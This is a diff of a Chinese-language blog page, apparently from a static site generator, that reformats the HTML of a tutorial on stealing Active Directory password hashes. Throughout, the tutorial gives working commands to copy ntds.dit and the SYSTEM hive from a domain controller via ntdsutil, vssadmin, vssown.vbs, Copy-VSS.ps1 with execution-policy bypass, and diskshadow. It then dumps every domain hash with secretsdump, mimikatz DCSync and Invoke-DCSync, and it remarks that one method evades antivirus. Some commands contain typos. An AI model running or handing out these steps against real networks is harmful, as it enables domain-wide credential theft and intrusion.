@@ -318,69 +318,88 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h3><h4 id="使用ntdsutil-工具提取"><a href="#使用ntdsutil-工具提取" class="headerlink" title="使用ntdsutil 工具提取"></a>使用ntdsutil 工具提取</h4><p>ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用ntdsutil.exe可以维护和管理互动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPRome.exe）成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上，可以在域控制器上直接操作，可以通过域内机器在域控制器上远程操作。</p>
-<p>ntdsutil.exe 支持的操作系统包括 Windows server 2003 ，Windows server 2008，Windows server 2012</p>
-<p> 使用方法如下</p>
-<h5 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h5><p>该快照包含windows中的所有文件，且在复制文件时不会受到windows锁定机制的限制</p>
-<p><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></p>
+        <h3 id="提取ntds.dit">提取ntds.dit</h3>
+<h4 id="使用ntdsutil-工具提取">使用ntdsutil 工具提取</h4>
+<p>ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用ntdsutil.exe可以维护和管理互动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPRome.exe）成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上，可以在域控制器上直接操作，可以通过域内机器在域控制器上远程操作。</p>
+<p>ntdsutil.exe 支持的操作系统包括 Windows server 2003 ，Windows server
+2008，Windows server 2012</p>
+<p>使用方法如下</p>
+<h5 id="创建快照">创建快照</h5>
+<p>该快照包含windows中的所有文件，且在复制文件时不会受到windows锁定机制的限制</p>
+<p><code>ntdsutil snapshot "activate instance ntds" create quit quit</code></p>
 <p>{}内为快照的GUID</p>
 <p><img src="/posts/77c245ea/ntdsutil_create_snapshot.png"></p>
-<h5 id="挂载快照"><a href="#挂载快照" class="headerlink" title="挂载快照"></a>挂载快照</h5><p><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></p>
+<h5 id="挂载快照">挂载快照</h5>
+<p><code>ntdsutil snapshot "mount &#123;GUID&#125;" quit quit</code></p>
 <p><img src="/posts/77c245ea/ntdsutil_load_snapshot.png"></p>
-<h5 id="拷贝快照"><a href="#拷贝快照" class="headerlink" title="拷贝快照"></a>拷贝快照</h5><p>使用windows自带的copy命令将快照中的文件复制出来,将快照中的<code>C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit</code>复制到本地计算机的 <code>C:\Users\Administrator\Desktop\</code> 桌面上</p>
+<h5 id="拷贝快照">拷贝快照</h5>
+<p>使用windows自带的copy命令将快照中的文件复制出来,将快照中的<code>C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit</code>复制到本地计算机的
+<code>C:\Users\Administrator\Desktop\</code> 桌面上</p>
 <p><code>copy C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</code></p>
 <p><img src="/posts/77c245ea/copy_ntds.png"></p>
-<h5 id="卸载并删除快照"><a href="#卸载并删除快照" class="headerlink" title="卸载并删除快照"></a>卸载并删除快照</h5><p><code>ntdsutil snapshot &quot;unmout &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></p>
+<h5 id="卸载并删除快照">卸载并删除快照</h5>
+<p><code>ntdsutil snapshot "unmout &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit</code></p>
 <p><img src="/posts/77c245ea/ntdsutil_delete_snapshot.png"></p>
-<h5 id="检查快照是否删除"><a href="#检查快照是否删除" class="headerlink" title="检查快照是否删除"></a>检查快照是否删除</h5><p><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></p>
+<h5 id="检查快照是否删除">检查快照是否删除</h5>
+<p><code>ntdsutil snapshot "List All" quit quit</code></p>
 <p><img src="/posts/77c245ea/ntdsutil_check_snapshot.png"></p>
-<br>
-
-<h4 id="利用vssadmin提取ntds-dit"><a href="#利用vssadmin提取ntds-dit" class="headerlink" title="利用vssadmin提取ntds.dit"></a>利用vssadmin提取ntds.dit</h4><p><code>vssadmin</code>是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息，显示已安装的所有卷影拷贝写入程序和提供程序，以及改变卷影拷贝的存储空间的大小等。</p>
-<p>适用于   Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</p>
-<h5 id="创建一个C盘的卷影拷贝"><a href="#创建一个C盘的卷影拷贝" class="headerlink" title="创建一个C盘的卷影拷贝"></a>创建一个C盘的卷影拷贝</h5><p><code>vssadmin create shadow /for=c:</code></p>
-<h5 id="将创建的卷影拷贝中的ntds-dit-copy到桌面"><a href="#将创建的卷影拷贝中的ntds-dit-copy到桌面" class="headerlink" title="将创建的卷影拷贝中的ntds.dit copy到桌面"></a>将创建的卷影拷贝中的ntds.dit copy到桌面</h5><p><code>copy \\?\CLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\User\Administrator\Desktop ntds.dit</code></p>
-<h5 id="删除创建的卷影拷贝"><a href="#删除创建的卷影拷贝" class="headerlink" title="删除创建的卷影拷贝"></a>删除创建的卷影拷贝</h5><p><code>vssadmin delete shadows /for=c:  /quiet</code></p>
+<p><br></p>
+<h4 id="利用vssadmin提取ntds.dit">利用vssadmin提取ntds.dit</h4>
+<p><code>vssadmin</code>是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息，显示已安装的所有卷影拷贝写入程序和提供程序，以及改变卷影拷贝的存储空间的大小等。</p>
+<p>适用于 Windows 10，Windows 8.1，Windows Server 2016，Windows Server
+2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server
+2008</p>
+<h5 id="创建一个c盘的卷影拷贝">创建一个C盘的卷影拷贝</h5>
+<p><code>vssadmin create shadow /for=c:</code></p>
+<h5 id="将创建的卷影拷贝中的ntds.dit-copy到桌面">将创建的卷影拷贝中的ntds.dit
+copy到桌面</h5>
+<p><code>copy \\?\CLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\User\Administrator\Desktop ntds.dit</code></p>
+<h5 id="删除创建的卷影拷贝">删除创建的卷影拷贝</h5>
+<p><code>vssadmin delete shadows /for=c:  /quiet</code></p>
 <p><img src="/posts/77c245ea/vssadmin.png"></p>
-<br>
-
-<h4 id="利用vssown-vbs-脚本提取nods-dit"><a href="#利用vssown-vbs-脚本提取nods-dit" class="headerlink" title="利用vssown.vbs 脚本提取nods.dit"></a>利用vssown.vbs 脚本提取nods.dit</h4><p>下载地址：<code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></p>
+<p><br></p>
+<h4 id="利用vssown.vbs-脚本提取nods.dit">利用vssown.vbs
+脚本提取nods.dit</h4>
+<p>下载地址：<code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></p>
 <p>vssown.vbs功能与vssadmin类似，本质是通过wmi对shadowCopt进行操作，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//启动卷影拷贝服务</span><br><span class="line">cscript vssown.vbs /start</span><br><span class="line">//创建一个C盘的卷影拷贝</span><br><span class="line">cscript vssown.vbs /create c</span><br><span class="line">//列出当前卷影拷贝</span><br><span class="line">cscript vssown.vbs /list</span><br><span class="line">//复制ntds.dit到桌面</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</span><br><span class="line">//删除卷影拷贝</span><br><span class="line">cscript vssown.vbs /delete &#123;GUID&#125;</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/77c245ea/vssown.png"></p>
-<h4 id="使用ntdsutil中的IFM获取ntds-dit"><a href="#使用ntdsutil中的IFM获取ntds-dit" class="headerlink" title="使用ntdsutil中的IFM获取ntds.dit"></a>使用ntdsutil中的IFM获取ntds.dit</h4><p>将ntds.dit复制到<code>C:\test\Active Directory\ </code>文件夹中</p>
+<h4 id="使用ntdsutil中的ifm获取ntds.dit">使用ntdsutil中的IFM获取ntds.dit</h4>
+<p>将ntds.dit复制到<code>C:\test\Active Directory\</code>文件夹中</p>
 <p>使用管理员模式打开cmd输入如下</p>
-<p><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:/test&quot; q  q</code></p>
+<p><code>ntdsutil "ac i ntds" "ifm" "create full C:/test" q  q</code></p>
 <p><img src="/posts/77c245ea/ntdsutil_IFM.png"></p>
-<p>然后访问c盘 可以看到创建了一个test目录  </p>
-<p>test目录下有俩个文件 分别为 <code>Active Directory</code>  和 <code>registry</code></p>
-<p><code>registry</code>下包含 <code>SYSTEM</code> 和 <code>SECURITY</code></p>
+<p>然后访问c盘 可以看到创建了一个test目录</p>
+<p>test目录下有俩个文件 分别为 <code>Active Directory</code> 和
+<code>registry</code></p>
+<p><code>registry</code>下包含 <code>SYSTEM</code> 和
+<code>SECURITY</code></p>
 <p><code>Active Directory</code>下包含 <code>ntds.dit</code></p>
 <p><img src="/posts/77c245ea/test_file.png"></p>
 <p>然后将以上内容复制到桌面</p>
 <p>这里选择使用<code>Copy-VSS.ps1</code></p>
 <p>下载地址：<code>https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</code></p>
-<p>进入powershell </p>
+<p>进入powershell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set-Executionpolicy bypass</span><br><span class="line">Import-Module .\Copy-VSS.ps1  //导入脚本</span><br><span class="line">copy-vss    //执行脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/77c245ea/copy_vss.png"></p>
-<br>
-
-<h4 id="使用diskshadow导出ntds-dit"><a href="#使用diskshadow导出ntds-dit" class="headerlink" title="使用diskshadow导出ntds.dit"></a>使用diskshadow导出ntds.dit</h4><p><code>Diskshadow.exe</code>使用卷影拷贝服务（VSS）所提供的多个功能。默认配置下，Diskshadow.exe使用了一种交互式的命令解释器,这里跟DiskRaid或者DiskPart比较类似。因为diskshadow的代码是由微软签名的，而且<code>Windows Server2008、Windows Server2012、Windows Server2016都默认包含diskshadow</code>。所以，diskshadow也可以用来操作卷影拷贝服务并导出ntds.dit。diskshadow的功能与vshadow类似，且同样位于<code>C:\windows\system32\ </code>目录下.</p>
+<p><br></p>
+<h4 id="使用diskshadow导出ntds.dit">使用diskshadow导出ntds.dit</h4>
+<p><code>Diskshadow.exe</code>使用卷影拷贝服务（VSS）所提供的多个功能。默认配置下，Diskshadow.exe使用了一种交互式的命令解释器,这里跟DiskRaid或者DiskPart比较类似。因为diskshadow的代码是由微软签名的，而且<code>Windows Server2008、Windows Server2012、Windows Server2016都默认包含diskshadow</code>。所以，diskshadow也可以用来操作卷影拷贝服务并导出ntds.dit。diskshadow的功能与vshadow类似，且同样位于<code>C:\windows\system32\</code>目录下.</p>
 <p>由于是微软官方的工具，所以不会被杀</p>
 <p>查看<code>diskshadow.exe</code> 的帮助信息</p>
 <p><code>diskshdow /?</code></p>
 <p>一般先在C盘写入需要执行的命令 存储为command.txt</p>
-<p><code>echo &quot;exec c:\windows\system32\calc.exe&quot;  &gt;command.txt</code></p>
-<p>但是这样生成的commod.txt会存在双引号 这样执行diskshadow命令的话 会无法正常执行，所以最好在执行diskshadow命令前先看下command.txt 是否正确</p>
+<p><code>echo "exec c:\windows\system32\calc.exe"  &gt;command.txt</code></p>
+<p>但是这样生成的commod.txt会存在双引号 这样执行diskshadow命令的话
+会无法正常执行，所以最好在执行diskshadow命令前先看下command.txt
+是否正确</p>
 <p><code>type c:\command.txt</code></p>
-<p><code>diskshadow /s c:\command</code> </p>
+<p><code>diskshadow /s c:\command</code></p>
 <p>然后会弹出之前写的calc</p>
 <p><img src="/posts/77c245ea/diskshadow_calc.png"></p>
-<p>使用<code>diskshadow.exe</code>导出<code>ntds.dit</code> 将命令写入文本文件中</p>
+<p>使用<code>diskshadow.exe</code>导出<code>ntds.dit</code>
+将命令写入文本文件中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//设置卷影拷贝</span><br><span class="line">set context persistent nowriters</span><br><span class="line">//添加卷</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">//创建快照</span><br><span class="line">create</span><br><span class="line">//分配虚拟磁盘盘符</span><br><span class="line">expose %someAlias% k:</span><br><span class="line">//将ntds.dit复制到C盘中</span><br><span class="line">exec &quot;cmd.exe&quot; /c copy k:\Windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\</span><br><span class="line">//删除所有快照</span><br><span class="line">delete shadows all</span><br><span class="line">//列出系统中的卷影拷贝</span><br><span class="line">list shadows all</span><br><span class="line">//重置</span><br><span class="line">reset</span><br><span class="line">//退出</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
-
 <p>然后使用<code>diskshadow.exe</code>加载这个文本文件</p>
 <p><code>diskshadow /s c:\2.txt</code></p>
 <p>在执行这条命令时 要在system32下执行，否则可能会报错</p>
@@ -389,14 +408,17 @@
 <p>可以使用Copy-VSS.ps1等方法导出SYSTEM文件，也可以执行如下命令，将导出system</p>
 <p><code>reg save hklm\system C:\Users\Administrator\Desktop\system.hive</code></p>
 <p><img src="/posts/77c245ea/reg_system.png"></p>
-<br>
-
-<h3 id="解析ntds-dit"><a href="#解析ntds-dit" class="headerlink" title="解析ntds.dit"></a>解析ntds.dit</h3><h4 id="使用impacket-secretsdump解析ntds-dit"><a href="#使用impacket-secretsdump解析ntds-dit" class="headerlink" title="使用impacket secretsdump解析ntds.dit"></a>使用impacket secretsdump解析ntds.dit</h4><p><code>secretsdump.exe -system SYSTEM.hive -ntds ntds.dit LOCAL</code></p>
+<p><br></p>
+<h3 id="解析ntds.dit">解析ntds.dit</h3>
+<h4 id="使用impacket-secretsdump解析ntds.dit">使用impacket
+secretsdump解析ntds.dit</h4>
+<p><code>secretsdump.exe -system SYSTEM.hive -ntds ntds.dit LOCAL</code></p>
 <p>然后可以看到所有用户的hash值</p>
 <p><img src="/posts/77c245ea/secretsdump_ntds.png"></p>
-<h4 id="利用dcsync-获取域散列值"><a href="#利用dcsync-获取域散列值" class="headerlink" title="利用dcsync 获取域散列值"></a>利用dcsync 获取域散列值</h4><h5 id="利用mimikatz在线导出hash"><a href="#利用mimikatz在线导出hash" class="headerlink" title="利用mimikatz在线导出hash"></a>利用mimikatz在线导出hash</h5><p>可以利用dcsync获取</p>
+<h4 id="利用dcsync-获取域散列值">利用dcsync 获取域散列值</h4>
+<h5 id="利用mimikatz在线导出hash">利用mimikatz在线导出hash</h5>
+<p>可以利用dcsync获取</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /domain:mamor.com /all /csv</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/77c245ea/mimikatz_dcsync.png"></p>
 <p>也可以导出指定用户的hash值</p>
 <p><code>lsadump::dcsync /domain:mamor.com /user:Mamor</code></p>
@@ -406,19 +428,19 @@
 <p>这样可以导出所有账户和域散列值</p>
 <p><img src="/posts/77c245ea/mimikatz_lsa1.png"></p>
 <p><img src="/posts/77c245ea/mimikatz_lsa2.png"></p>
-<h5 id="使用powershell-Invoke-DCSync-ps1脚本"><a href="#使用powershell-Invoke-DCSync-ps1脚本" class="headerlink" title="使用powershell Invoke-DCSync.ps1脚本"></a>使用powershell Invoke-DCSync.ps1脚本</h5><p>下载地址：<code>https://gist.github.com/monoxgas/9d238accd969550136db</code></p>
+<h5 id="使用powershell-invoke-dcsync.ps1脚本">使用powershell
+Invoke-DCSync.ps1脚本</h5>
+<p>下载地址：<code>https://gist.github.com/monoxgas/9d238accd969550136db</code></p>
 <p>该脚本可以利用dcsync 直接读取ntds.dit 以获得域账号和域散列值</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hash</span><br><span class="line"></span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      // 导出域内administrator账户的hash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/77c245ea/ps_invoke-DCSync.png"></p>
-<br>
-
-<br>
-
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/">https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1731472">https://cloud.tencent.com/developer/article/1731472</a></p>
+<p><br></p>
+<p><br></p>
+<h3 id="reference">Reference</h3>
+<blockquote>
+<p>https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/</p>
+<p>https://www.freebuf.com/articles/network/251267.html</p>
+<p>https://cloud.tencent.com/developer/article/1731472</p>
 </blockquote>
 
     </div>
@@ -549,7 +571,11 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.</span> <span class="nav-text">提取ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ntdsutil-%E5%B7%A5%E5%85%B7%E6%8F%90%E5%8F%96"><span class="nav-number">1.1.</span> <span class="nav-text">使用ntdsutil 工具提取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.1.</span> <span class="nav-text">创建快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%82%E8%BD%BD%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.2.</span> <span class="nav-text">挂载快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8B%B7%E8%B4%9D%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.3.</span> <span class="nav-text">拷贝快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%B8%E8%BD%BD%E5%B9%B6%E5%88%A0%E9%99%A4%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.4.</span> <span class="nav-text">卸载并删除快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E5%BF%AB%E7%85%A7%E6%98%AF%E5%90%A6%E5%88%A0%E9%99%A4"><span class="nav-number">1.1.5.</span> <span class="nav-text">检查快照是否删除</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8vssadmin%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.2.</span> <span class="nav-text">利用vssadmin提取ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAC%E7%9B%98%E7%9A%84%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><span class="nav-number">1.2.1.</span> <span class="nav-text">创建一个C盘的卷影拷贝</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%86%E5%88%9B%E5%BB%BA%E7%9A%84%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E4%B8%AD%E7%9A%84ntds-dit-copy%E5%88%B0%E6%A1%8C%E9%9D%A2"><span class="nav-number">1.2.2.</span> <span class="nav-text">将创建的卷影拷贝中的ntds.dit copy到桌面</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E5%88%9B%E5%BB%BA%E7%9A%84%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><span class="nav-number">1.2.3.</span> <span class="nav-text">删除创建的卷影拷贝</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8vssown-vbs-%E8%84%9A%E6%9C%AC%E6%8F%90%E5%8F%96nods-dit"><span class="nav-number">1.3.</span> <span class="nav-text">利用vssown.vbs 脚本提取nods.dit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ntdsutil%E4%B8%AD%E7%9A%84IFM%E8%8E%B7%E5%8F%96ntds-dit"><span class="nav-number">1.4.</span> <span class="nav-text">使用ntdsutil中的IFM获取ntds.dit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8diskshadow%E5%AF%BC%E5%87%BAntds-dit"><span class="nav-number">1.5.</span> <span class="nav-text">使用diskshadow导出ntds.dit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90ntds-dit"><span class="nav-number">2.</span> <span class="nav-text">解析ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8impacket-secretsdump%E8%A7%A3%E6%9E%90ntds-dit"><span class="nav-number">2.1.</span> <span class="nav-text">使用impacket secretsdump解析ntds.dit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8dcsync-%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">2.2.</span> <span class="nav-text">利用dcsync 获取域散列值</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8mimikatz%E5%9C%A8%E7%BA%BF%E5%AF%BC%E5%87%BAhash"><span class="nav-number">2.2.1.</span> <span class="nav-text">利用mimikatz在线导出hash</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8powershell-Invoke-DCSync-ps1%E8%84%9A%E6%9C%AC"><span class="nav-number">2.2.2.</span> <span class="nav-text">使用powershell Invoke-DCSync.ps1脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E5%8F%96ntds.dit"><span class="nav-number">1.</span> <span class="nav-text">提取ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ntdsutil-%E5%B7%A5%E5%85%B7%E6%8F%90%E5%8F%96"><span class="nav-number">1.1.</span> <span class="nav-text">使用ntdsutil 工具提取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.1.</span> <span class="nav-text">创建快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%82%E8%BD%BD%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.2.</span> <span class="nav-text">挂载快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8B%B7%E8%B4%9D%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.3.</span> <span class="nav-text">拷贝快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%B8%E8%BD%BD%E5%B9%B6%E5%88%A0%E9%99%A4%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.4.</span> <span class="nav-text">卸载并删除快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E5%BF%AB%E7%85%A7%E6%98%AF%E5%90%A6%E5%88%A0%E9%99%A4"><span class="nav-number">1.1.5.</span> <span class="nav-text">检查快照是否删除</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8vssadmin%E6%8F%90%E5%8F%96ntds.dit"><span class="nav-number">1.2.</span> <span class="nav-text">利用vssadmin提取ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAc%E7%9B%98%E7%9A%84%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><span class="nav-number">1.2.1.</span> <span class="nav-text">创建一个C盘的卷影拷贝</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%86%E5%88%9B%E5%BB%BA%E7%9A%84%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E4%B8%AD%E7%9A%84ntds.dit-copy%E5%88%B0%E6%A1%8C%E9%9D%A2"><span class="nav-number">1.2.2.</span> <span class="nav-text">将创建的卷影拷贝中的ntds.dit
+copy到桌面</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E5%88%9B%E5%BB%BA%E7%9A%84%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><span class="nav-number">1.2.3.</span> <span class="nav-text">删除创建的卷影拷贝</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8vssown.vbs-%E8%84%9A%E6%9C%AC%E6%8F%90%E5%8F%96nods.dit"><span class="nav-number">1.3.</span> <span class="nav-text">利用vssown.vbs
+脚本提取nods.dit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ntdsutil%E4%B8%AD%E7%9A%84ifm%E8%8E%B7%E5%8F%96ntds.dit"><span class="nav-number">1.4.</span> <span class="nav-text">使用ntdsutil中的IFM获取ntds.dit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8diskshadow%E5%AF%BC%E5%87%BAntds.dit"><span class="nav-number">1.5.</span> <span class="nav-text">使用diskshadow导出ntds.dit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90ntds.dit"><span class="nav-number">2.</span> <span class="nav-text">解析ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8impacket-secretsdump%E8%A7%A3%E6%9E%90ntds.dit"><span class="nav-number">2.1.</span> <span class="nav-text">使用impacket
+secretsdump解析ntds.dit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8dcsync-%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">2.2.</span> <span class="nav-text">利用dcsync 获取域散列值</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8mimikatz%E5%9C%A8%E7%BA%BF%E5%AF%BC%E5%87%BAhash"><span class="nav-number">2.2.1.</span> <span class="nav-text">利用mimikatz在线导出hash</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8powershell-invoke-dcsync.ps1%E8%84%9A%E6%9C%AC"><span class="nav-number">2.2.2.</span> <span class="nav-text">使用powershell
+Invoke-DCSync.ps1脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -565,7 +591,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -613,7 +639,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -627,7 +653,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
